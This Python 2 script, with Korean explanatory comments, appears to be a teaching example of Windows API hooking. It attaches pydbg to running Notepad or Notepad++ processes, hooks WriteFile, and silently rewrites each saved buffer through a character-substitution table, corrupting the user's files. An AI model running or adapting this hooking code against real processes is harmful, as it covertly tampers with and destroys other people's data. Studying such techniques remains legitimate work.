#-*- coding: utf-8 -*-
import utils, sys
from pydbg import *
from pydbg.defines import *
'''
BOOL WINAPI WriteFile(
  _In_         HANDLE hFile,
  _In_         LPCVOID lpBuffer,
  _In_         DWORD nNumberOfBytesToWrite,
  _Out_opt_    LPDWORD lpNumberOfBytesWritten,
  _Inout_opt_  LPOVERLAPPED lpOverlapped
);
'''
isProcess=False
before=["`","1","2","3","4","5","6","7","8","9","0","-","+",
            "q","w","e","r","t","y","u","i","o","p","[","]","\\",
            "a","s","d","f","g","h","j","k","l",";","'","z","x",
            "c","v","b","n","m",",",".","/","~","!","@","#","$",
            "%","^","&","*","(",")","_","+","Q","W","E","R","T",
            "Y","U","I","O","P","{","}","|","A","S","D","F","G",
            "H","J","K","L",":",'"',"Z","X","C","V","B","N","M","<",">","?"]
after=["v","@","c","/","~","n",",","m","!","z","b",".","x",
          "E","$","w","^","I","*","(","P","_","+","Q","%","#",
          "R","T","Y","k","&","O",")","{","}","|","a","s","d",
          "H","g","h","j","U","l",";","'","C","S","D","F","M",
          "f","J","K","L",":",'"',"2","X","A","V","7","N","G",
          "0",">","+","`","e","Z","3","4","5","6","B","o","9",
          "<","-","?","q","w","1","r","t","y","u","i","8","p","[","]","\\"]
targetProcessList=["notepad.exe", "notepad++.exe"]

def replaceString(dbg, args): # 후킹 작업을 하는 콜백 함수로 디버그 이벤트가 발생할 때 호출됨
    try:
        global before, after
        buffer=dbg.read_process_memory(args[1], args[2]) # 메모리 주소를 읽어 값을 반환
        for i in range(0, len(before)):
            if before[i] in buffer: # 버퍼에 해당 값이 있을 경우
                #print "[+] Before : %s" % buffer
                buffer=buffer.replace(before[i], after[i]) # 값 변조
                dbg.write_process_memory(args[1], buffer) # 변조된 버퍼 메모리에 쓰기
                #print "[+] After : %s" % dbg.read_process_memory(args[1], args[2])
        return DBG_CONTINUE
    except Exception, e:
        #print "[-] ", e
        return DBG_CONTINUE
def main():
    try:
        global isProcess, targetProcessList
        confirm=0
        dbg=pydbg()
        for(pid, name) in dbg.enumerate_processes(): # 현재 실행중인 모든 프로세스를 탐색
            for targetProcess in targetProcessList:
                if(name==targetProcess): # 현재 실행중인 프로세스 중에 타겟 프로세스가 있을 경우
                    isProcess=True
                    hooks=utils.hook_container() # 모든 후킹 객체를 담을 공간 확보     
                    dbg.attach(pid) # 해당 프로세스의 핸들을 얻어 클래스 내부에 저장
                    #print "[+] Saves a process handle in self.h_process of pid[%d]" % pid
                    hookAddress=dbg.func_resolve_debuggee("kernel32.dll", "WriteFile") # 핸들을 이용해 Win32 API 함수 주소를 찾아 반환     
                    if hookAddress: # 해당 함수 주소 반환에 성공했을 경우
                        hooks.add(dbg, hookAddress, 5, replaceString, None) # 해당 함수에 중단점 설정 후 콜백함수 등록
                        #print "[+] sets a breakpoint at the designated address : 0x%08x" % hookAddress
                        confirm=1
                        break
                    else:
                        #print "[-] couldn't resolve hook address"
                        exit(0)
            if(confirm==1):
                break
        if isProcess: # 타겟 프로세스가 실행중인 경우
            dbg.run() # 디버그 이벤트가 발생하면 콜백함수 호출
        else: # 타겟 프로세스가 종료된 경우
            #print "[-] There in no process [%s]" % targetProcess
            exit(0)
    except Exception, e:
        if "DebugActiveProcess" in str(e):
            #print "[-] Open the C:\Windows\SysWOW64\notepad.exe Not C:\Windows\System32\notepad.exe"
            exit(0)
        #print "[-] ", e 
        exit(0)
        
if __name__=="__main__":
    main()
